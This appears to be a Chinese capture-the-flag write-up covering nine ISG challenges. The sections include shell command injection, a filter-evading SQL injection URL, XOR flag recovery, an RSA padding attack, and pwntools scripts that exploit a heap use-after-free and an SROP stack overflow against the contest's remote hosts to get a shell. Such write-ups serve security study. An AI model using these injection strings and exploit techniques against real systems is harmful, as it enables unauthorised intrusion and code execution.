
## 一、calc

注入shell命令: a";ls;"  发现存在文件: there_1s_4_fl4g
注入:  a"cat there_1s_4_fl4g # 得到flag


## 二、secret
在 chrome 浏览器中打开 view-source:http://202.120.7.207:60007/
![](2.1.png)
ZmxhZzpJU0d7SDNJSU9fMXNHX2pzX1RyNHB9 做 base64 解码得到 flag:ISG{H3IIO_1sG_js_Tr4p}
(也可以关闭JS，访问F12查看源码得到密文，再做解密)

## 三、news
查看对输入进行了过滤的codesafe函数：
![](3.1.png)
使用正则表达式对输入进行过滤；变换大小写绕过过滤规则。
构造payload如下：
http://202.120.7.206:60009/news-1/**/and/**/1>2/**/union/**/Select/**/flag,2/**/from/**/flag.html
访问得到flag

## 四、junkcode
Ida pro 载入：发现两段数据
![](4.1.png)
逐字节异或即可：

```
#!/usr/bin/python
# -*- coding: UTF-8 -*-
Arr1 = [0xDF,0xD8,0x8D,0xA3,0x18,0xAC,0x86,0x8B,0xA8,0x6E,0x76,0x24,0x4C,0x1D,0xCC,0xAF,0x4A,0x73,0x5E,0x24,0xDC,0xD5,0xA7]

Arr2 = [0x96,0x8B,0xCA,0xD8,0x72,0xF9,0xE8,0xC0,0xF7,0x0D,0x46,0x40,0x29,0x42,0xA2,0x9F,0x3E,0x2C,0x34,0x71,0xB2,0x9E,0xDA]

for index in range(len(Arr1)):
  print  chr( Arr1[index] ^Arr2[index])
```
## 五、babynote
程序存在UAF漏洞，先使用smallbin来泄漏出libc地址
然后使用fastbin unlink将malloc的返回地址指向__malloc_hook - 0x13的地方
将__malloc_hook的值，指向one_garget
最后使用double free来触发

```
#!/usr/bin/env python # encoding: utf-8
from pwn import *
context.terminal = ['tmux', 'splitw', '-h', '-p', '60']
#r = process("./babynote")
r = remote("202.120.7.206" ,60002)
def add(size, content):
     r.sendlineafter(">", "1") 
     r.sendlineafter(":", str(size)) 
     r.sendafter(":", content)

def edit(idx, content): 
    r.sendlineafter(">", "3") 
    r.sendlineafter(":", str(idx)) 
    r.sendafter(":", content)

def show(idx): 
    r.sendlineafter(">", "2") 
    r.sendlineafter(":", str(idx))
def delete(idx): 
    r.sendlineafter(">", "4") 
    r.sendlineafter(":", str(idx))

add(0x98, "a\n") 
add(0x68, "a\n") 
add(0x68, "a\n") 
add(0x68, "a\n")
   
delete(0)
show(0) 
r.recvuntil("Note:")
leak = u64(r.recv(6) + "\x00\x00") - 0x68 
base = leak - 0x3c4b10
one_garget = base + 0xf02a4
log.success("Malloc Hook is 0x%x" %leak)
delete(1) 
delete(2)
edit(2, p64(leak - 0x13) + "\n")
add(0x68, "a\n")
add(0x68, "aaa" + p64(one_garget) * 2 + "\n")
delete(4) 
delete(4)
r.interactive()
```
## 六、sign
抽取出程序核心逻辑之后，把核心代码抽出来单独编译运行。
```
#include "defs.h"
#include <string.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>

void sub_4008A6(_DWORD flag_array[], __int32 rand_array[], int flag_len_mod4)
{
  unsigned int v3; // ST3C_4
  unsigned int v4; // eax
  unsigned int v6; // [rsp+28h] [rbp-18h]
  signed int i; // [rsp+2Ch] [rbp-14h]
  unsigned int v8; // [rsp+30h] [rbp-10h]
  unsigned int round_rand; // [rsp+34h] [rbp-Ch]
  int round_rand_byte; // [rsp+38h] [rbp-8h]

  for ( i = 0; i <= 33; ++i )
  {
    v6 = flag_array[flag_len_mod4 - 1];
    v8 = 0;
    round_rand = rand();
    round_rand_byte = (round_rand >> 8) & 7;
    while ( flag_len_mod4 - 1 > v8 )
    {
      v3 = flag_array[v8 + 1];
      flag_array[v8] += ((v6 ^ rand_array[(v8 ^ round_rand_byte) & 7]) + (round_rand ^ v3)) ^ (((v6 >> 5) ^ 4 * v3)
                                             + ((v3 >> 3) ^ 16 * v6));
      v4 = v8++;
      v6 = flag_array[v4];
    }
    flag_array[flag_len_mod4 - 1] += ((v6 ^ rand_array[(v8 ^ round_rand_byte) & 7]) + (round_rand ^ *flag_array)) ^ (((v6 >> 5) ^ 4 * *flag_array) + ((*flag_array >> 3) ^ 16 * v6));
  }
}
unsigned __int8 flag[28];// = "xxxxxxxxxxxxxxxxxxxxxxxxxxxx"; // [rsp+28h] [rbp-C8h]

int main(__int64 a1, char **a2, char **a3)
{
  unsigned int v3; // eax
  unsigned int i; // [rsp+18h] [rbp-D8h]
  int j; // [rsp+1Ch] [rbp-D4h]
  int flag_len_div4; // [rsp+20h] [rbp-D0h]
  int fd; // [rsp+24h] [rbp-CCh]
  int randarray[8]; // [rsp+30h] [rbp-C0h]
  struct stat stat_buf; // [rsp+50h] [rbp-A0h]

#define ENC "FD969889E4B8A47F3C444EFDCD8C3491FA08E775D4E21280585E8CE9"
  int flag_len = 28;
  flag_len_div4 = (flag_len + 3 ) >> 2;

  int tstart = 1535616512;

  v3 = tstart;
  srand(v3);
  for ( i = 0; i < 8; ++i )
    randarray[i] = rand();
  randarray[7] = 0;
  sub_4008A6(flag, randarray, flag_len_div4);
  for ( j = 0; 4 * flag_len_div4 > j; ++j )
    printf("%02X", flag[j]);
  putchar(10);

  char* k = calloc(flag_len, 2);
  for ( j = 0; j < flag_len; ++j )
      snprintf(&k[j*2],3,  "%02X", flag[j]);
  printf("%s\n",k);

  if (strcmp(ENC, k)){
      printf("GG\n");
  } else {
      printf("OjbK\n");
      return 1;
  }
  free(k);
  
  return 0LL;
}
// 400A5C: using guessed type int randarray[8];
```
## 七、stackoverflow
IDA静态分析下载程序，发现溢出位置：
![](7.1.png)
对程序进行测试，发现在24位后就会爆出错误，就构建了一个50位的a，之后会收到[Y]/[N]，按接收到]后再做下个溢出
![](7.2.png)
继续测试发现第三个溢出点：在8位就能报错显示出已失败，初步猜测应该是在这做命令执行：
![](7.3.png)
编写脚本，在本地进行调试和爆破，可以获得shell
![](7.4.png)
远程连接，获得flag 
![](7.5.png)
![](7.6.png)

## 八、babyrsa
flag内容会生成随机的padding，最后一个bytes由用户提供，返回RSA加密的密文。  
用户可以提供3次，但每次的padding都是重新随机生成的。所以，先去掉flag中随机的因素。  
注意到：如果输入错误内容，由于try-catch机制，cnt不会增加，但flag = flag[:bits//8-padsize]语句依然执行，所以会少清空一个字符这样flag的内容会逐渐加长，需要padding的逐渐减少。最终可以使得 flag长度正好不需要随机padding。因为n的总长度是限制，flag最大不超过256bytes，所以只需要连续输入 256 次字 母（不是数字）内容。    
接下来，提供 3 个不同的末尾 bytes 即可。根据RSA的计算方式，最后相当于求解同余意义下的三元线性方程组。为了方便计算，3 个末尾 bytes 分别取 0, 1,2:
对应的方程组是：
```
    x^3 = r1 mod n 
    (256x+1)^3 = r2 mod n 
    (256x+2)^3 = r3 mod n
```
x 是带有 padding 的 flag;r1, r2, r3 是末尾为 0, 1, 2 所得到的密文。
直接求解方程组，得到xmodn。转换成ascii码格式，保留前面的flag。

 

## 九、stackoverflow2
首先在main函数溢出，进入restart函数。  
在try again 后输入还可以进行溢出，这次溢出布局payload，让一个env指针指向非法地址，execve会执行失败返回，接下来进行srop。因为已经在函数中存在execve函数，这里只需要直接控制好寄存器值便可以拿到shell。

```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
context.log_level="debug"
pwn_file="./stackoverflow2"
elf=ELF(pwn_file)

if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("202.120.7.206",60014)
    pid=0

r.sendlineafter(":","LIBC_FATAL_STDERR_=1\x00/bin/bash\x00")
r.sendlineafter("Overflow","a"*0x30)
f={
    0:"aaaa",
    0x12c+0x28:p64(0x601f00)*8+p64(0x6010f5)+p64(0)+p64(0x601f00)*2+\
            p64(0)+p64(0x601f00)*2+p64(0x601a00)+p64(elf.sym["execve"])+\
            p64(0)+p16(0x33)+p16(0)*2,
    0xb54:p64(0)+p64(0x6010e0)+p64(0xdeadbeef),
}
r.sendlineafter("[N] ",fit(f,filler="\x00"))
r.interactive()
```